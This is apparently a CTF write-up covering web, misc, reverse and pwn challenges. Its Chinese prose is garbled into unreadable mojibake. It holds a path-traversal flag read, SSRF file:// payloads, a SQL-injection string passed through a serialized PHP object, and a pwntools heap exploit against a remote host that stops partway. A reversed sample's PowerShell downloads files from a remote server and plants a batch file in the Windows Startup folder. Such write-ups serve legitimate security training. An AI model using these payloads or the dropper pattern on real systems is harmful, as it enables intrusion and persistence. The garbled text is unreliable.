<h3 id="ezsqliã€å·²è§£å†³ã€‘"><a href="#ezsqliã€å·²è§£å†³ã€‘" class="headerlink" title="ezsqliã€å·²è§£å†³ã€‘"></a>ezsqliã€å·²è§£å†³ã€‘</h3><p>flag{de3110dce011088cd4add1950a49182f}</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web2.png" alt="å›¾ç‰‡"></p>
<h3 id="Secret-Guess"><a href="#Secret-Guess" class="headerlink" title="Secret Guess"></a>Secret Guess</h3><p><a href="http://124.71.167.32:32768/" target="_blank" rel="noopener">http://124.71.167.32:32768/</a></p>
<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> env <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'dotenv'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> hbs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'hbs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> process <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">{</span> extended<span class="token punctuation">:</span> <span class="token boolean">false</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"views/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">engine</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">,</span> hbs<span class="token punctuation">.</span>__express<span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'html'</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>auth <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>auth <span class="token operator">===</span> <span class="token string">'string'</span> <span class="token operator">&amp;&amp;</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>env<span class="token punctuation">.</span>parsed<span class="token punctuation">.</span>secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">===</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>auth <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>result<span class="token punctuation">:</span> process<span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"echo $FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"index"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>result<span class="token punctuation">:</span> <span class="token string">"wrong secret"</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">"app.js"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token string">"0.0.0.0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>CVE-2017-14849æ¼æ´</p>
<p>flagåœ¨ static/../../foo/../../../usr/local/app/.env</p>
<p>buuojä¸Šæœ‰ç¯å¢ƒ ç›´æ¥å¤ç°ä¸€ä¸‹</p>
<p><a href="https://paper.seebug.org/439/" target="_blank" rel="noopener">https://paper.seebug.org/439/</a></p>
<h3 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h3><p>ä¸€ä¸ªç®€å•çš„SSRFï¼Ÿï¼Ÿï¼Ÿ</p>
<p><a href="http://124.71.187.100:8079/" target="_blank" rel="noopener">http://124.71.187.100:8079/</a></p>
<p>è¯»æ–‡ä»¶ï¼Œè¯»åˆ°indexï¼š</p>
<pre class=" language-plain"><code class="language-plain"><!--?php
error_reporting(0);
session_start();
require_once "lib.php";
init();

$is_die = 0;
$is_post = 0;
$die_mess = '';
$url = '';

if (isset($_POST['url']) && isset($_POST['captcha']) && !empty($_POST['url']) && !empty($_POST['captcha']))
{
$url = $_POST['url'];
$captcha = $_POST['captcha'];
$is_post = 1;
if ( $captcha !== $_SESSION['answer'])
{
$die_mess = "wrong captcha";
$is_die = 1;
}

if ( preg_match('/flag|proc|log/i', $url) )
{
$die_mess = "hacker";
$is_die = 1;
}
}

?--></code></pre>
<p>lib.php</p>
<pre class=" language-plain"><code class="language-plain"><!--?php
session_start();
function curl($url){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
curl_close($ch);
return $output;
}

function set_session()
{
$answer = rand(1,100000);
$_SESSION['captcha'] = substr(md5($answer),-6,6);
$_SESSION['answer'] = strval($answer);
}

function destroy_session()
{
$_SESSION = [];
}

function init()
{
if (!isset($_SESSION['captcha']) || !isset($_SESSION['answer']) || isset($_GET['reset']))
{
destroy_session();
set_session();
isset($_GET['reset']) ? die("<script--></code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web3.png" alt="å›¾ç‰‡"></p>
<p>/etc/apache2/apache2.conf</p>
<p><a href="file:///etc/apache2/sites-enabled/000-default.conf">file:///etc/apache2/sites-enabled/000-default.conf</a></p>
<pre class=" language-plain"><code class="language-plain">ServerAdmin webmaster@localhost DocumentRoot /var/www/html ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined 
ServerAdmin secret@localhost DocumentRoot /var/www/htmlssrf123123 ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined</code></pre>
<p><a href="file:///etc/apache2/ports.conf">file:///etc/apache2/ports.conf</a></p>
<pre><code>Listen 80 Listen 47852 Listen 443 Listen 443</code></pre><p>è¯»ç¬¬äºŒä¸ªwebç›®å½•è¯»æ–‡ä»¶ï¼š<br><a href="file:///var/www/htmlssrf123123/index.php">file:///var/www/htmlssrf123123/index.php</a></p>
<pre class=" language-plain"><code class="language-plain"><!--?php
    if(isset($_POST['cmd'])){
        exec($_POST['cmd']);
    } 
?--></code></pre>
<p>ç›²RCE<br>å®˜æ–¹WPï¼š</p>
<p>åŒå±‚ç¼–ç ç»•è¿‡= =</p>
<pre class=" language-plain"><code class="language-plain">payloadï¼š
file:///%66%6c%61%67
flag{8f62d75de5b51d69799790cdf2cf05d4}</code></pre>
<h3 id="warmupã€å·²è§£å†³ã€‘"><a href="#warmupã€å·²è§£å†³ã€‘" class="headerlink" title="warmupã€å·²è§£å†³ã€‘"></a>warmupã€å·²è§£å†³ã€‘</h3><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">check_login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"database error, please check your input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">===</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"username or password incorrect!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string">"welcome, admin! this is your flag -> "</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"welcome! but you are not admin"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span> <span class="token punctuation">(</span><span class="token string">"select username,password from "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">.</span><span class="token string">" where username='"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">.</span><span class="token string">"' and password='"</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"union"</span><span class="token punctuation">,</span> <span class="token string">"join"</span><span class="token punctuation">,</span> <span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token string">"\""</span><span class="token punctuation">,</span> <span class="token string">"#"</span><span class="token punctuation">,</span> <span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"&amp;"</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"`"</span><span class="token punctuation">,</span> <span class="token string">"{"</span><span class="token punctuation">,</span> <span class="token string">"|"</span><span class="token punctuation">,</span> <span class="token string">"}"</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token string">">"</span><span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">,</span> <span class="token string">"@"</span><span class="token punctuation">,</span> <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">"]"</span> <span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad hacker,go out!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad hacker,go out!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'bad hacker,go out!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre>
<p>YToxOntzOjI6ImlwIjtzOjEyOiIxODMuMjM2LjAuOTEiO30=</p>
<p>a:1:{s:2:â€ipâ€;s:12:â€183.236.0.91â€;}</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">SQL</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$table</span><span class="token operator">=</span><span class="token string">"users"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string">"admin' or '1'='1"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$SQL</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SQL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$SQL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>å†base64ç¼–ç å°±è¡Œäº†</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/web4.png" alt="å›¾ç‰‡"></p>
<p>flag{5dd2d5f45fw6e6f11ewf1f224f5121e2}</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="emisc"><a href="#emisc" class="headerlink" title="emisc"></a>emisc</h3><p>elfå¯æ‰§è¡Œæ–‡ä»¶</p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/misc1.png" alt="å›¾ç‰‡"></p>
<h2 id="ä½ è§‰å¾—è¿™ä¸ªæ˜¯ä»€ä¹ˆæ–‡ä»¶"><a href="#ä½ è§‰å¾—è¿™ä¸ªæ˜¯ä»€ä¹ˆæ–‡ä»¶" class="headerlink" title="ä½ è§‰å¾—è¿™ä¸ªæ˜¯ä»€ä¹ˆæ–‡ä»¶"></a>ä½ è§‰å¾—è¿™ä¸ªæ˜¯ä»€ä¹ˆæ–‡ä»¶</h2><p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%AE%89%E7%AB%9E%E8%B5%9B/misc2.png" alt="å›¾ç‰‡"></p>
<h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><pre class=" language-plain"><code class="language-plain"># $client = new-object System.Net.WebClient;
# $client.DownloadFile("http://192.168.69.129:8000/ielogo.png", "$env:temp/20203917.tmp")
# $client.DownloadFile("http://192.168.69.129:8000/_TMP12", "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\helper.bat")

# read file
$content = [IO.File]::ReadAllText("$pwd\doc.chm")
$idx1 = $content.IndexOf("xxxxxxxx")

$helper = $content.Substring($idx1 + 8)
$cont = [System.Convert]::FromBase64String($helper)

Set-Content "$env:temp\20201122.tmp" $cont -Encoding byte</code></pre>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="noteplusã€å·²è§£å†³ã€‘"><a href="#noteplusã€å·²è§£å†³ã€‘" class="headerlink" title="noteplusã€å·²è§£å†³ã€‘"></a>noteplusã€å·²è§£å†³ã€‘</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>



LOCAL <span class="token operator">=</span> <span class="token boolean">False</span>
binfile<span class="token operator">=</span><span class="token string">'./noteplus'</span>
libcfile<span class="token operator">=</span><span class="token string">'./libc-2.27.so'</span>
offset<span class="token operator">=</span><span class="token number">0</span>



e<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binfile<span class="token punctuation">)</span>

context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span>e<span class="token punctuation">.</span>arch
<span class="token keyword">if</span> context<span class="token punctuation">.</span>arch<span class="token operator">==</span><span class="token string">'i386'</span><span class="token punctuation">:</span>
    x86<span class="token operator">=</span><span class="token boolean">True</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    x86<span class="token operator">=</span><span class="token boolean">False</span>

<span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
    c <span class="token operator">=</span> process<span class="token punctuation">(</span>binfile<span class="token punctuation">)</span>
    <span class="token keyword">if</span> libcfile<span class="token punctuation">:</span>
        libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>libcfile<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> x86<span class="token punctuation">:</span>
            libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/i386-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'121.36.245.213'</span><span class="token punctuation">,</span><span class="token number">23333</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> libcfile<span class="token punctuation">:</span>
        libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span>libcfile<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Size: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rm</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">view</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'ce: '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Index: '</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
  c<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">)</span>



<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0x4</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  rm<span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">-</span>i<span class="token punctuation">)</span>

rm<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>



<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
  add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">)</span>

view<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
